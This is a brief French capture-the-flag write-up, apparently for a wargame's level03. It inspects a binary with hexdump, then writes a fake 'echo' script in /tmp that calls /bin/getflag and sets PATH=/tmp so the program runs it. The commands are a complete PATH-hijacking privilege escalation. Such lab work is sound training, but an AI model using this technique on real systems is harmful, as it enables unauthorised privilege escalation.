```
$> ./level03
Exploit me
$>
```
On peut voir dans l'executable avec hexdump

```sh
hexdump -C level03 | grep Exploit -B 5 -A 5
```

ON peut ensuite faire un faux echo qui executera getflag, et Changer le PATH pour donner priorite a notre executable et forcer ./level03 a executer getflag.
```
echo /bin/getflag > /tmp/echo
chmod 777 /tmp/echo
export PATH=/tmp
./level03
```
